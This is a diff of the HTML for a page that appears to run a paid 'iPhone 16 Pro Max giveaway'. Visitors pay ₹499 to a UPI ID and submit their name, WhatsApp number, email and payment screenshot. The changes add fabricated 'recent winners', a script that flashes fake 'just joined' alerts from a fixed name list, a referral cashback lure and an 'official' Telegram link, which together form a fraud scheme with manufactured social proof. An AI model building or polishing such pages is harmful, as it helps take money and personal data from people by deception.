@@ -3,95 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rs499 iPhone 16 Pro Max Giveaway</title>
+    <title>Official iPhone 16 Pro Max Giveaway | Win for ₹499</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        /* Modern Design Updates */
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        
+        :root {
+            --primary-orange: #ff6600;
+            --dark-bg: #111;
+            --glass: rgba(255, 255, 255, 0.1);
+        }
+
+        /* Animated Winner Section */
+        #winner-section {
+            padding: 40px 20px;
+            text-align: center;
+            background: linear-gradient(135deg, #fff5e6, #ffdfba);
+            overflow: hidden;
+        }
+        .winner-title {
+            font-size: 28px;
+            color: #d35400;
+            animation: pulse 2s infinite;
+            margin-bottom: 25px;
+        }
+        .winner-container {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .winner-box {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            border: 2px solid #f39c12;
+            transition: 0.3s;
+            min-width: 200px;
+            animation: slideIn 1s ease-out;
+        }
+        .winner-box:hover { transform: translateY(-10px); }
+        .prize-tag { background: #27ae60; color: white; padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+
+        /* Countdown Style */
         #countdown {
             font-size: 2rem;
             font-weight: bold;
-            color: #d35400;
+            color: #e74c3c;
             text-align: center;
-            padding: 20px;
-            background: #fff3e0;
+            margin: 20px 0;
+            padding: 15px;
+            background: #fdf2f2;
             border-radius: 10px;
-            margin: 20px auto;
-            max-width: 600px;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.05);
+            display: inline-block;
+            width: 100%;
         }
 
-        .payment-card {
+        /* Professional Form */
+        #payment-submission {
             background: #ffffff;
-            border-radius: 15px;
-            padding: 30px;
-            max-width: 550px;
+            border: 1px solid #ddd;
+            border-radius: 20px;
+            max-width: 500px;
             margin: 40px auto;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-            border-top: 5px solid #27ae60;
+            padding: 35px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
         }
-
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        .input-group label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: 5px;
-            color: #333;
-        }
-
-        .input-group input {
+        .form-input {
             width: 100%;
             padding: 12px;
-            border: 1px solid #ddd;
+            margin-bottom: 15px;
+            border: 2px solid #eee;
             border-radius: 8px;
-            box-sizing: border-box; /* Fix for padding issue */
+            box-sizing: border-box;
+            transition: 0.3s;
         }
-
+        .form-input:focus { border-color: var(--primary-orange); outline: none; }
+        
         .submit-btn {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #27ae60, #2ecc71);
+            padding: 18px;
+            background: #27ae60;
             color: white;
             border: none;
             border-radius: 8px;
-            font-size: 18px;
+            font-size: 1.1rem;
             font-weight: bold;
             cursor: pointer;
-            transition: 0.3s transform;
+            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.4);
         }
 
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(46, 204, 113, 0.4);
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-50px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
         }
     </style>
 </head>
 <body>
 
-    <div id="winner-section" style="padding: 40px; text-align: center; background: linear-gradient(135deg, #fff5e6, #ffdfba);">
-        <h2 class="winner-title">🎉 Previous iPhone Winners 🎉</h2>
-        <div class="winner-container" style="display: flex; justify-content: center; gap: 20px; overflow: hidden;">
+    <div id="winner-section">
+        <h2 class="winner-title">🎉 RECENT GIVEAWAY WINNERS 🎉</h2>
+        <div class="winner-container">
             <div class="winner-box">
-                <img src="winner.jpg" width="50" alt="user">
+                <img src="winner.jpg" width="60" alt="user" style="border-radius: 50%;">
                 <h4>Ankit Sharma</h4>
                 <p>Code: GG-0052</p>
-                <span class="prize-tag">iPhone 15 Pro</span>
+                <span class="prize-tag">iPhone 15 Pro Max Received</span>
+            </div>
+            <div class="winner-box">
+                <img src="winner.jpg" width="60" alt="user" style="border-radius: 50%;">
+                <h4>Rahul Biswas</h4>
+                <p>Code: GG-0098</p>
+                <span class="prize-tag">iPhone 15 Pro Received</span>
             </div>
         </div>
     </div>
 
     <section id="hero" style="text-align: center; padding: 50px 20px;">
-        <h1>Rs499 iPhone 16 Pro Max Giveaway</h1>
-        <p>Enter for a chance to win big! Pay ₹499 to join the fun.</p>
-        <button id="cta-button" style="padding: 15px 30px; font-size: 1.2rem; background: #ff6600; color: white; border: none; border-radius: 5px; cursor: pointer;">Enter Giveaway – ₹499</button>
+        <h1 style="color: var(--primary-orange); font-size: 2.5rem;">Rs499 iPhone 16 Pro Max Giveaway</h1>
+        <p>Your chance to own the latest iPhone is just ₹499 away!</p>
+        <button id="cta-button" style="background: var(--primary-orange); color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 1.2rem; cursor: pointer; font-weight: bold;">Enter Giveaway Now</button>
     </section>
-
-    <div id="countdown">Loading Timer...</div>
 
     <div class="image-container" style="display: flex; justify-content: center; gap: 15px; padding: 20px; flex-wrap: wrap;">
         <div class="giveaway-box" style="flex: 1; max-width: 400px; text-align: center;">
@@ -99,68 +135,103 @@
             <p style="color: #ff6600; font-weight: bold;">Premium Design</p>
         </div>
         <div class="giveaway-box" style="flex: 1; max-width: 400px; text-align: center;">
-            <img src="Rightt.jpg" alt="iPhone 16" style="width: 100%; border-radius: 12px; border: 3px solid #ff6600;">
+            <img src="Rightt.jpg" alt="Official" style="width: 100%; border-radius: 12px; border: 3px solid #ff6600;">
             <p style="color: #ff6600; font-weight: bold;">Official Giveaway</p>
         </div>
     </div>
 
-    <section class="payment-card">
-        <h3 style="text-align: center; margin-bottom: 10px;">Join the Giveaway</h3>
-        <p style="text-align: center; color: #e74c3c; font-weight: bold; margin-bottom: 20px;">
-            Step 1: Scan QR & Pay ₹499 <br> Step 2: Submit Details below
-        </p>
+    <div style="text-align: center; padding: 20px;">
+        <h3 style="margin-bottom: 5px;">Time Remaining:</h3>
+        <div id="countdown">Loading...</div>
+    </div>
 
-        <div style="text-align: center; margin-bottom: 25px; border: 2px dashed #f39c12; padding: 15px; border-radius: 10px;">
-            <img src="Qrcode.jpg" alt="QR Code" width="200">
-            <p><strong>UPI ID:</strong> <span style="color: #2980b9;">Q258020709@ybl</span></p>
+    <div style="text-align: center; margin: 20px 0;">
+        <a href="https://t.me/iphone17promaxgiveway" target="_blank" style="background: #0088cc; color: white; padding: 12px 25px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block;">
+            🚀 JOIN OFFICIAL TELEGRAM GROUP
+        </a>
+    </div>
+
+    <section id="payment-submission">
+        <h3 style="text-align: center; color: #333;">Join the Giveaway</h3>
+        <p style="font-size: 14px; color: #e74c3c; text-align: center; font-weight: bold;">Step 1: Scan QR & Pay ₹499 <br> Step 2: Fill Form & Upload Screenshot</p>
+        
+        <div style="text-align: center; margin: 20px 0; padding: 15px; border: 2px dashed #f39c12; border-radius: 10px;">
+            <img src="Qrcode.jpg" alt="Payment QR" width="200">
+            <p style="margin-top: 10px;"><strong>UPI ID:</strong> <span style="color: #2980b9;">Q258020709@ybl</span></p>
         </div>
 
         <form action="https://formspree.io/f/mzdggroe" method="POST" enctype="multipart/form-data">
-            <div class="input-group">
-                <label>Full Name</label>
-                <input type="text" name="name" placeholder="As per Aadhaar/UPI" required>
-            </div>
-            <div class="input-group">
-                <label>WhatsApp Number</label>
-                <input type="tel" name="phone" placeholder="To receive Unique Code" required>
-            </div>
-            <div class="input-group">
-                <label>Email Address</label>
-                <input type="email" name="email" placeholder="active email address" required>
-            </div>
-            <div class="input-group">
-                <label>Payment Screenshot</label>
-                <input type="file" name="screenshot" accept="image/*" required>
-            </div>
-            <button type="submit" class="submit-btn">CLAIM MY ENTRY CODE</button>
+            <label>Full Name:</label>
+            <input type="text" name="name" class="form-input" placeholder="Enter full name" required>
+            
+            <label>WhatsApp Number:</label>
+            <input type="tel" name="phone" class="form-input" placeholder="For Unique Code" required>
+            
+            <label>Email Address:</label>
+            <input type="email" name="_replyto" class="form-input" placeholder="Enter email" required>
+            
+            <label>Payment Screenshot:</label>
+            <input type="file" name="upload" accept="image/*" required style="margin-bottom: 20px; display: block;">
+            
+            <button type="submit" class="submit-btn">Submit & Claim My Code</button>
         </form>
     </section>
 
-    <script>
-        // --- COUNTDOWN TIMER ---
-        const countdownDate = new Date("Feb 28, 2026 23:59:59").getTime();
+    <div class="refer-card" style="background: linear-gradient(135deg, #ffcc00, #ff6600); padding: 30px; border-radius: 20px; text-align: center; margin: 30px auto; max-width: 450px; color: #000;">
+        <h2>🎁 REFER & WIN!</h2>
+        <p>Share with friends for <strong>UPTO 70% CASHBACK</strong></p>
+        <a href="https://api.whatsapp.com/send?text=Hey! 🔥 Check out this iPhone 16 Pro Max Giveaway! Just pay ₹499 and win! Join here: https://officialgiveawayin.github.io/Official-Giveaway-in/" target="_blank">
+            <button style="background-color: #25D366; border: none; color: white; padding: 15px 35px; border-radius: 50px; font-size: 1.1rem; font-weight: 900; cursor: pointer; width: 100%;">🚀 SHARE ON WHATSAPP</button>
+        </a>
+    </div>
 
-        const timer = setInterval(function() {
-            const now = new Date().getTime();
-            const distance = countdownDate - now;
-
-            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-            document.getElementById("countdown").innerHTML = `Giveaway Ends In: ${days}d ${hours}h ${minutes}m ${seconds}s`;
-
-            if (distance < 0) {
-                clearInterval(timer);
-                document.getElementById("countdown").innerHTML = "GIVEAWAY CLOSED";
-            }
-        }, 1000);
-    </script>
-
-    <footer style="text-align: center; padding: 30px; background: #222; color: #fff;">
+    <footer style="text-align: center; padding: 30px; background: #111; color: #ccc;">
         <p>&copy; 2026 Lucky499 Giveaway. All rights reserved.</p>
     </footer>
 
+    <script>
+        function updateCountdown() {
+            const targetDate = new Date("February 28, 2026 23:59:59").getTime();
+            const now = new Date().getTime();
+            const difference = targetDate - now;
+
+            if (difference < 0) {
+                document.getElementById("countdown").innerHTML = "GIVEAWAY CLOSED";
+                return;
+            }
+
+            const days = Math.floor(difference / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((difference % (1000 * 60)) / 1000);
+
+            document.getElementById("countdown").innerHTML = 
+                `${days}d ${hours}h ${minutes}m ${seconds}s`;
+        }
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+    </script>
+
+    <div id="live-toast" style="position: fixed; bottom: 20px; right: 20px; background: #ff6600; color: #fff; padding: 12px 25px; border-radius: 50px; display: none; z-index: 9999; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+        <span id="winner-name" style="font-weight: bold;"></span> &nbsp;just joined!
+    </div>
+
+    <script>
+        (function() {
+            const names = ["Rahul S.", "Ankit M.", "Sohail K.", "Priya D.", "Vikram J.", "Sneha R."];
+            const toast = document.getElementById('live-toast');
+            const nameSpan = document.getElementById('winner-name');
+
+            function showNotification() {
+                nameSpan.innerText = names[Math.floor(Math.random() * names.length)];
+                toast.style.display = 'block';
+                setTimeout(() => { toast.style.display = 'none'; }, 4000);
+            }
+
+            setInterval(showNotification, 10000);
+        })();
+    </script>
+
 </body>
-</html>
+    </html>
+    
